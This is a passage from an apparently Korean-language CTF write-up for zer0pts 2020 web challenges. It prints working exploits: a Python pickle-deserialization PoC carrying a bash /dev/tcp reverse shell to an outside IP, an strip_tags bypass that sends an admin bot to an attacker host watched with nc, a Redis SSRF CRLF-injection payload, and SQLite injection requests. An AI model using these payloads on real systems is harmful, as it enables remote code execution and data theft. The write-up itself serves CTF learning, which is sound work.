</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="number">0</span> &lt;= nid &lt; <span class="built_in">len</span>(data):</span><br><span class="line">        nid = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> flask.render_template(<span class="string">&#x27;index.html&#x27;</span>, data=data, nid=nid)</span><br><span class="line">...</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot; Load saved notes &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        savedata = flask.session.get(<span class="string">&#x27;savedata&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">        data = pickle.loads(base64.b64decode(savedata))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        data = [&#123;<span class="string">&quot;date&quot;</span>: now(), <span class="string">&quot;text&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;title&quot;</span>: <span class="string">&quot;*New Note*&quot;</span>&#125;]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>pickle unserialize 가 실행되는 곳은 <code>load</code> 함수로 세션에서 <code>savedata</code> 값을 가져와 base64 복호화 한 후 <code>pickle.loads</code> 를 실행하고 있습니다.</p><p>따라서 savedata 값을 조작해준 후, load 함수를 호출하는 <code>/note/&lt;int:nid&gt;</code> 경로를 요청하면 됩니다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> SecureCookieSessionInterface</span><br><span class="line"><span class="keyword">import</span> os, sys, pickle, base64, requests</span><br><span class="line"></span><br><span class="line">COMMAND = <span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/15.165.0.114/8888 0&gt;&amp;1&#x27;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PickleRce</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (os.system,(COMMAND,))</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">App</span>(<span class="title class_ inherited__">object</span>):  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.secret_key = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">app = App()  </span><br><span class="line">app.secret_key = <span class="string">b&#x27;\\\xe4\xed&#125;w\xfd3\xdc\x1f\xd72\x07/C\xa9I&#x27;</span></span><br><span class="line"></span><br><span class="line">si = SecureCookieSessionInterface()</span><br><span class="line">serializer = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">session = serializer.dumps(&#123;<span class="string">&#x27;savedata&#x27;</span>:base64.b64encode(pickle.dumps(PickleRce()))&#125;)</span><br><span class="line"></span><br><span class="line">requests.get(<span class="string">&#x27;http://3.112.201.75:8001/note/1&#x27;</span>, cookies = &#123;</span><br><span class="line">    <span class="string">&#x27;session&#x27;</span>: session</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>위는 pickle unserialize 를 이용해 rce를 하는 poc입니다.</p><h2 id="653pts-MusicBlog-2nd-solve"><a href="#653pts-MusicBlog-2nd-solve" class="headerlink" title="[653pts] MusicBlog (2nd solve)"></a>[653pts] MusicBlog (2nd solve)</h2><ul><li><a href="https://file.rwx.kr/ctf/2020/zer0pts/MusicBlog_637545797ab8638bffd877d7be2ec045.tar.gz">MusicBlog.tar.gz</a></li></ul><blockquote><p>You can introduce favorite songs to friends with <strong>MusicBlog</strong>!</p></blockquote><p>분류를 정하기 힘든 문제인데, client side attack 입니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// (snipped)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> flag = <span class="string">&#x27;zer0pts&#123;&lt;censored&gt;&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// (snipped)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">crawl</span> = <span class="keyword">async</span> (<span class="params">url</span>) =&gt; &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`[+] Query! (<span class="subst">$&#123;url&#125;</span>)`</span>);</span><br><span class="line">    <span class="keyword">const</span> page = <span class="keyword">await</span> browser.<span class="title function_">newPage</span>();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">await</span> page.<span class="title function_">setUserAgent</span>(flag);</span><br><span class="line">        <span class="keyword">await</span> page.<span class="title function_">goto</span>(url, &#123;</span><br><span class="line">            <span class="attr">waitUntil</span>: <span class="string">&#x27;networkidle0&#x27;</span>,</span><br><span class="line">            <span class="attr">timeout</span>: <span class="number">10</span> * <span class="number">1000</span>,</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">await</span> page.<span class="title function_">click</span>(<span class="string">&#x27;#like&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(err);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">await</span> page.<span class="title function_">close</span>();</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`[+] Done! (<span class="subst">$&#123;url&#125;</span>)`</span>)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// (snipped)</span></span><br></pre></td></tr></table></figure><p>주어진 소스에서 worker.js 를 확인해 보면 페이지가 작성되면 관리자가 게시글에 들어가 like 버튼을 누른 후 봇이 종료됨을 확인할 수 있습니다.</p><p>플래그는 관리자의 user-agent 값에 포함되어 있네요.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$nonce</span> = <span class="title function_ invoke__">get_nonce</span>();</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Security-Policy: default-src &#x27;self&#x27;; object-src &#x27;none&#x27;; script-src &#x27;nonce-$&#123;nonce&#125;&#x27; &#x27;strict-dynamic&#x27;; base-uri &#x27;none&#x27;; trusted-types&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;X-Frame-Options: DENY&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;X-XSS-Protection: 1; mode=block&#x27;</span>);</span><br></pre></td></tr></table></figure><p>서버에는 csp 가 걸려있어, 외부로 요청을 보낼 수 없습니다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// [[URL]] → &lt;audio src=&quot;URL&quot;&gt;&lt;/audio&gt;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render_tags</span>(<span class="params"><span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$str</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/\[\[(.+?)\]\]/&#x27;</span>, <span class="string">&#x27;&lt;audio controls src=&quot;\\1&quot;&gt;&lt;/audio&gt;&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">  <span class="variable">$str</span> = <span class="title function_ invoke__">strip_tags</span>(<span class="variable">$str</span>, <span class="string">&#x27;&lt;audio&gt;&#x27;</span>); <span class="comment">// only allows `&lt;audio&gt;`</span></span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>본 문제의 중요한 부분은 여기입니다.<br>게시글 작성 중에 사용되는 필터링 함수에서는, <code>strip_tags</code> 함수를 사용하고 있는데 본 함수에 존재하는 취약점을 통해 문제를 해결할 수 있습니다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">strip_tags</span>(<span class="string">&#x27;&lt;a/udio&gt;&#x27;</span>, <span class="string">&#x27;&lt;audio&gt;&#x27;</span>));</span><br><span class="line"><span class="comment">// string(8) &quot;&lt;a/udio&gt;&quot;</span></span><br></pre></td></tr></table></figure><p>audio 태그만 허용해야 하는 것이 정상이지만, strip_tags 는 태그 사이에 slash 가 들어가는 것을 허용하고 있습니다. 따라서 우리는 a 태그를 사용할 수 있게 됩니다.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;mt-4&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;badge badge-secondary&quot;</span>&gt;</span>Secret<span class="tag">&lt;/<span class="name">span</span>&gt;</span>            titie here          <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;text-muted&quot;</span>&gt;</span>by posix <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;badge badge-love badge-pill&quot;</span>&gt;</span>♥ 0<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;mt-3&quot;</span>&gt;</span></span><br><span class="line">        content here          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;mt-3&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;like.php?id=5dfd06e9-741b-4fff-a3a5-4f5e8e79dac8&quot;</span> <span class="attr">id</span>=<span class="string">&quot;like&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-love&quot;</span>&gt;</span>♥ Like this post<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>또한 content 가 들어가는 부분도 like 버튼보다 상위에 위치하고 있습니다.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a/udio id=&quot;like&quot; href=&quot;http://rwx.kr:8888&quot;&gt;x</span><br></pre></td></tr></table></figure><p>따라서 위와 같은 태그를 삽입해 주면, 공격자 서버로 접속하도록 할 수 있습니다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ nc -lvp 8888</span><br><span class="line">Listening on [0.0.0.0] (family 0, port 8888)</span><br><span class="line">Connection from ec2-3-112-201-75.ap-northeast-1.compute.amazonaws.com 53510 received!</span><br><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: rwx.kr:8888</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: zer0pts&#123;M4sh1m4fr3sh!!&#125;</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Referer: http://challenge/post.php?id=2116dfe6-5cf1-459a-b575-cd59b08cdfa5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en-US</span><br></pre></td></tr></table></figure><h2 id="435pts-urlapp"><a href="#435pts-urlapp" class="headerlink" title="[435pts] urlapp"></a>[435pts] urlapp</h2><ul><li><a href="https://file.rwx.kr/ctf/2020/zer0pts/urlapp_ddd9109207a713b8bcdc2a300bef27b6.tar.gz">urlapp.tar.gz</a></li></ul><blockquote><p>application <a href="http://3.112.201.75:8004/">here</a></p></blockquote><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;sinatra&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;uri&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;socket&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">connect</span><span class="params">()</span></span></span><br><span class="line">  sock = TCPSocket.open(<span class="string">&quot;redis&quot;</span>, <span class="number">6379</span>)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> <span class="keyword">not</span> ping(sock) <span class="keyword">then</span></span><br><span class="line">    exit</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> sock</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">query</span><span class="params">(sock, cmd)</span></span></span><br><span class="line">  sock.write(cmd + <span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recv</span><span class="params">(sock)</span></span></span><br><span class="line">  data = sock.gets</span><br><span class="line">  <span class="keyword">if</span> data == <span class="literal">nil</span> <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">  <span class="keyword">elsif</span> data[<span class="number">0</span>] == <span class="string">&quot;+&quot;</span> <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">return</span> data[<span class="number">1</span>..-<span class="number">1</span>].strip</span><br><span class="line">  <span class="keyword">elsif</span> data[<span class="number">0</span>] == <span class="string">&quot;$&quot;</span> <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">if</span> data == <span class="string">&quot;$-1\r\n&quot;</span> <span class="keyword">then</span></span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">return</span> sock.gets.strip</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ping</span><span class="params">(sock)</span></span></span><br><span class="line">  query(sock, <span class="string">&quot;ping&quot;</span>)</span><br><span class="line">  <span class="keyword">return</span> recv(sock) == <span class="string">&quot;PONG&quot;</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set</span><span class="params">(sock, key, value)</span></span></span><br><span class="line">  query(sock, <span class="string">&quot;SET <span class="subst">#&#123;key&#125;</span> <span class="subst">#&#123;value&#125;</span>&quot;</span>)</span><br><span class="line">  <span class="keyword">return</span> recv(sock) == <span class="string">&quot;OK&quot;</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(sock, key)</span></span></span><br><span class="line">  query(sock, <span class="string">&quot;GET <span class="subst">#&#123;key&#125;</span>&quot;</span>)</span><br><span class="line">  <span class="keyword">return</span> recv(sock)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">before <span class="keyword">do</span></span><br><span class="line">  sock = connect()</span><br><span class="line">  set(sock, <span class="string">&quot;flag&quot;</span>, File.read(<span class="string">&quot;flag.txt&quot;</span>).strip)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&#x27;/&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">if</span> params.has_key?(<span class="symbol">:q</span>) <span class="keyword">then</span></span><br><span class="line">    q = params[<span class="symbol">:q</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (q =~ <span class="regexp">/^[0-9a-f]&#123;16&#125;$/</span>)</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    sock = connect()</span><br><span class="line">    url = get(sock, q)</span><br><span class="line">    redirect url</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  send_file <span class="string">&#x27;index.html&#x27;</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">post <span class="string">&#x27;/&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">if</span> <span class="keyword">not</span> params.has_key?(<span class="symbol">:url</span>) <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  url = params[<span class="symbol">:url</span>]</span><br><span class="line">  <span class="keyword">if</span> <span class="keyword">not</span> (url =~ URI.regexp) <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  key = Random.urandom(<span class="number">8</span>).unpack(<span class="string">&quot;H*&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">  sock = connect()</span><br><span class="line">  set(sock, key, url)</span><br><span class="line"></span><br><span class="line">  <span class="string">&quot;<span class="subst">#&#123;request.host&#125;</span>:<span class="subst">#&#123;request.port&#125;</span>/?q=<span class="subst">#&#123;key&#125;</span>&quot;</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>루비로 구성된 redis ssrf 문제입니다.<br>개행에 대한 처리가 되어있지 않으므로 flag 키에 저장된 값을 가져와 원하는 대로 저장해서 불러와주면 됩니다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">// Request 1</span><br><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 3.112.201.75:8004</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 117</span><br><span class="line"></span><br><span class="line">url=http://rwx.kr</span><br><span class="line">eval &quot;redis.call(&#x27;set&#x27;,&#x27;e41cf0f94e050661&#x27;,&#x27;http://rwx.kr?&#x27;..redis.call(&#x27;get&#x27;,&#x27;flag&#x27;));return 1;&quot; 0</span><br><span class="line"></span><br><span class="line">// Request 2</span><br><span class="line">GET /?q=e41cf0f94e050661 HTTP/1.1</span><br><span class="line">Host: 3.112.201.75:8004</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">// Response</span><br><span class="line">HTTP/1.1 302 Found</span><br><span class="line">Content-Type: text/html;charset=utf-8</span><br><span class="line">Location: http://rwx.kr?zer0pts&#123;sh0rt_t0_10ng_10ng_t0_sh0rt&#125;</span><br><span class="line">Content-Length: 0</span><br><span class="line">X-Xss-Protection: 1; mode=block</span><br><span class="line">X-Content-Type-Options: nosniff</span><br><span class="line">X-Frame-Options: SAMEORIGIN</span><br><span class="line">Server: WEBrick/1.6.0 (Ruby/2.7.0/2019-12-25)</span><br><span class="line">Date: Sun, 08 Mar 2020 21:40:28 GMT</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><h2 id="755pts-phpNantokaAdmin"><a href="#755pts-phpNantokaAdmin" class="headerlink" title="[755pts] phpNantokaAdmin"></a>[755pts] phpNantokaAdmin</h2><ul><li><a href="https://file.rwx.kr/ctf/2020/zer0pts/phpNantokaAdmin_49b112bf908ecef40f17684f4120b0aa.tar.gz">phpNantokaAdmin</a></li></ul><blockquote><p><strong>phpNantokaAdmin</strong> is a management tool for SQLite.</p></blockquote><p>Sqlite injection 문제입니다. 기존에 sqlite 에 대한 연구가 부족했기에 푸는데에 꽤나 오래 걸렸습니다.</p><p>본 문제를 해결하기 위해 응용되는 sqlite 문법은 총 3가지 입니다.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> [<span class="keyword">sql</span>] <span class="keyword">from</span> sqlite_master;</span><br></pre></td></tr></table></figure><p>첫번째는 square bracket 입니다.<br>mssql 구문과의 호환성을 위해 sqlite 에서는 square bracket 을 다른 쿼트와 같은 기능을 할 수 있도록 지원하고 있습니다.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> sometbl (somecol <span class="type">INT</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> sometbl <span class="keyword">values</span>(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">select</span> somecol <span class="keyword">from</span> sometbl;</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">select</span> somecol somecoaaaal <span class="keyword">from</span> sometbl;</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><p>두번째는 잘못된 문법 사용에 대한 것인데, sqlite 에서는 컬럼 사이에 반점을 붙여주지 않으면 실제로 존재하는 컬럼인지에 관계없이 뒤에 오는 컬럼명을 무시합니다. </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> sometbl2 <span class="keyword">as</span> <span class="keyword">select</span> <span class="number">2</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> sometbl2;</span><br><span class="line"><span class="number">2</span></span><br></pre></td></tr></table></figure><p>세번째는 <code>create table .. as select ..</code> 문입니다.<br>본 구문은 괄호 없이 테이블 생성을 가능하도록 합니다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /?page=create HTTP/1.1</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">table_name=[aaa]as select [sql][&amp;columns[0][name]=]from sqlite_master;&amp;columns[0][type]=2</span><br></pre></td></tr></table></figure><p><img src="/img/2020/03/image-20200309090320124.png" alt="image-20200309090320124"></p><p>위에서 제시한 세가지 문법을 사용한 후, <code>/?page=index</code> 에 접속하면 플래그가 들어있는 테이블과 컬럼명을 확인할 수 있습니다. 이후에는 같은 방법으로 플래그를 읽으면 됩니다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /?page=create HTTP/1.1</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">table_name=[aaa]as select [flag_2a2d04c3][&amp;columns[0][name]=]from flag_bf1811da;&amp;columns[0][type]=2</span><br></pre></td></tr></table></figure><p><img src="/img/2020/03/image-20200309090554181.png" alt="image-20200309090554181"></p><h2 id="345pts-Can-you-guess-it-2nd-solve"><a href="#345pts-Can-you-guess-it-2nd-solve" class="headerlink" title="[345pts] Can you guess it (2nd solve)"></a>[345pts] Can you guess it (2nd solve)</h2><ul><li><a href="https://file.rwx.kr/ctf/2020/zer0pts/Can%20you%20guess%20it%3F_ffc668f78ed564bf7a62463fd16bc26c.tar.gz">Can_you_guess_it.tar.gz</a></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>; <span class="comment">// FLAG is defined in config.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span 